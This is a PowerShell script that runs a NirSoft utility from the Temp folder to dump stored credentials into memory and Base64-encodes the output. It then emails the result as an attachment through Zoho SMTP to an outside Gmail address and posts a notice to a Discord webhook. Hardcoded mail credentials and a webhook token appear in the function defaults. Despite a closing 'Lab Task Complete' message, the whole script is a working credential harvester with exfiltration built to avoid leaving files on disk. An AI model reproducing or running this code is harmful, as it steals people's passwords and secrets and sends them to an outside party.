$global:isEmailSent = $false

function Send-ZohoEmail {
    param (
        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
        [string]$ToEmail = "srve650@gmail.com",
        [string]$Subject,
        [string]$Body = "Hello, this is a test email with an attachment.",
        [string[]]$Attachments = @(),  # Optional parameter for attachments
        [string]$SmtpServer = "smtp.zoho.com",
        [int]$Port = 587,
        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
        [string]$Password = "LHjzKTbzDApt"
    )

    $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"

    # Create the email message
    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $FromEmail
    $mailMessage.To.Add($ToEmail)
    $mailMessage.Subject = $Subject
    $mailMessage.Body = $Body

    # Attach files if provided
    foreach ($attachmentPath in $Attachments) {
        if (Test-Path $attachmentPath) {
            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
            $mailMessage.Attachments.Add($attachment)
        } else {
            Write-Host "Warning: File not found - $attachmentPath"
        }
    }

    # Configure the SMTP client
    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtpClient.EnableSsl = $true  # Enables STARTTLS
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    # Send the email
    try {
        Write-Host "Sending Email.... please wait..."
        $smtpClient.Send($mailMessage)
        Write-Host "Email sent successfully."
        $message = "Email sent successfully to $toEmail. " + $Subject
        # Send the webhook notification
        Send-EmailNotification -ToEmail $toEmail -WebhookUrl $email_webhookUrl -Message $message
        SetEmailSentTrue
    } catch {
        Write-Host "Error: $_"
        SetEmailSentFalse
    } finally {
        # Clean up attachments and mail message
        foreach ($attachment in $mailMessage.Attachments) {
            $attachment.Dispose()
        }
        $mailMessage.Dispose()
    }
}

# 1. Capture NirSoft output directly into RAM (Standard Output)
# No file is created on the hard drive
# Use the environment variable to point to the Temp folder
$rawData = & "$env:TEMP\example.exe" /sstdout | Out-String

# 2. Obfuscate the data using Base64
$bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
$b64String = [System.Convert]::ToBase64String($bytes)

# 3. Create a Memory Stream from the scrambled data
$ms = New-Object System.IO.MemoryStream
$writer = New-Object System.IO.StreamWriter($ms)
$writer.Write($b64String)
$writer.Flush()
$ms.Position = 0

# 4. Create the Email Attachment (exists only in RAM)
$attachment = New-Object Net.Mail.Attachment($ms, "$env:TEMP\data.txt")

# 5. Send Email via TLS
if (-not $isEmailSent) {
    # Email parameters
    $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
    $attachments = @($attachment)  # Array of attachment file paths
    Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
}

# 6. Secure Cleanup
$attachment.Dispose()
$ms.Dispose()
Write-Host "Lab Task Complete. Memory Purged." -ForegroundColor Green